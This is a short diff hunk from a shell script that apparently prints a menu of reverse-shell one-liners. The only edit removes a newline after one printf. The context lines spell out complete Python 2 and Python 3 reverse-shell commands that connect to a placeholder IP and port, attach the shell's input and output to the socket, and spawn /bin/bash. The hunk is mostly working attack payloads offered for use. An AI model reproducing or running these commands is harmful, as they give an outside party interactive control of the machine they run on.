@@ -169,7 +169,7 @@ printf "$PY1"
 printf "	
 -py2		"
 PY2=$(echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((~[ip]~,[port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(~/bin/bash~)'" | sed s/\~/\"/g)
-printf "$PY2\n"
+printf "$PY2"
 printf "
 -py3		"
 PY3=$(echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((~[ip]~,[port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(~/bin/bash~)'" | sed s/\~/\"/g)
